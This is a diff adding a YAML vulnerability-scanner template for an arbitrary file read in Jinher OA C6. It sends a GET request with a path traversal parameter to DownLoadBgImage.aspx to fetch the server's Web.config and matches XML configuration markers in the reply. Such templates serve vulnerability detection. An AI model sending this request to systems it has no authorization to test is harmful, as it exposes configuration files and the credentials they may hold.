@@ -1,0 +1,23 @@
+id: poc-yaml-jinher-downLoadbgimage-fileread
+info:
+  name: 金和OA C6 DownLoadBgImage Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version="
+          - "<configSections>"
+          - "</section>"
+          - "</webServices>"
+          - "</configuration>"
+        part: body
